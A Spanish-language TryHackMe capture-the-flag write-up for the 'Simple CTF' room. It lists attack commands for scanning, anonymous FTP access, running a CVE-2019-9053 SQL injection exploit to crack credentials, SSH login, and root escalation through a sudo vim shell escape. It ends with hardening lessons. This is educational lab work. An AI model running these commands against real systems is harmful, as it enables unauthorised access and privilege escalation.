# Simple CTF — TryHackMe Writeup

**Plataforma:** TryHackMe  
**Room:** Simple CTF  
**Dificultad:** Fácil  
**Fecha:** Mayo 2026

---

## Índice

1. [Reconocimiento](#reconocimiento)
2. [Enumeración FTP](#enumeración-ftp)
3. [Explotación Web — CVE-2019-9053](#explotación-web--cve-2019-9053)
4. [Acceso inicial — SSH](#acceso-inicial--ssh)
5. [Escalada de privilegios](#escalada-de-privilegios)
6. [Flags](#flags)
7. [Conclusiones](#conclusiones)

---

## Reconocimiento

Escaneo inicial con `nmap` para descubrir puertos y servicios abiertos.

```bash
nmap -sV -sC -oN nmap_initial.txt <TARGET_IP>
```

### Resultados

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd |
| 80/tcp | HTTP | Apache httpd 2.4.18 |
| 2222/tcp | SSH | OpenSSH 7.2p2 |

> **Nota:** SSH corre en el puerto no estándar 2222.

---

## Enumeración FTP

El servidor FTP acepta conexión con el usuario `anonymous`, una configuración habitual en servidores mal asegurados que permite acceso sin credenciales reales.

```bash
ftp <TARGET_IP> 21
```

```
Name: anonymous
Password: (cualquier valor / vacío)
```

### Descarga de recursos

```bash
ls -la
get <fichero>.txt
```

El fichero descargado contenía una pista indicando el directorio `/simple` en el servidor web.

---

## Explotación Web — CVE-2019-9053

Navegando a `http://<TARGET_IP>/simple` se identifica **CMS Made Simple**, vulnerable a inyección SQL basada en tiempo.

**CVE:** [CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)  
**Tipo:** SQL Injection (time-based blind)  
**Componente afectado:** CMS Made Simple < 2.2.10

### Explotación

```bash
python exploit.py -u http://<TARGET_IP>/simple --crack -w /path/to/wordlist.txt
```

### Credenciales obtenidas

| Campo | Valor |
|-------|-------|
| Usuario | `mitch` |
| Contraseña | `secret` |

---

## Acceso inicial — SSH

Con las credenciales extraídas, se accede vía SSH al puerto no estándar 2222.

```bash
ssh mitch@<TARGET_IP> -p 2222
```

### Flag de usuario

```bash
cat ~/user.txt
```

---

## Escalada de privilegios

### Enumeración sudo

```bash
sudo -l
```

El usuario `mitch` puede ejecutar `vim` como root sin necesidad de contraseña:

```
(root) NOPASSWD: /usr/bin/vim
```

### Explotación mediante GTFOBins

Referencia: [gtfobins.github.io/gtfobins/vim](https://gtfobins.github.io/gtfobins/vim/)

```bash
sudo vim -c ':!/bin/bash'
```

Esto abre una shell con privilegios de root.

### Flag de root

```bash
cat /root/root.txt
```

---

## Flags

| Flag | Ruta |
|------|------|
| User | `/home/mitch/user.txt` |
| Root | `/root/root.txt` |

---

## Conclusiones

### Vectores de ataque identificados

- **FTP anónimo habilitado** — permitió el acceso sin autenticación y la descarga de información sensible.
- **CMS desactualizado (CVE-2019-9053)** — SQLi explotable con PoC público permitió extraer credenciales.
- **Sudo misconfiguration** — permisos NOPASSWD sobre `vim` permitieron escalada trivial a root.

### Lecciones aprendidas

- Deshabilitar el acceso anónimo en FTP si no es estrictamente necesario.
- Mantener los CMS actualizados y aplicar parches de seguridad.
- Principio de mínimo privilegio en configuraciones `sudo`: nunca conceder NOPASSWD sobre editores de texto.

---

*Writeup elaborado con fines educativos en el contexto del programa ASIR.*
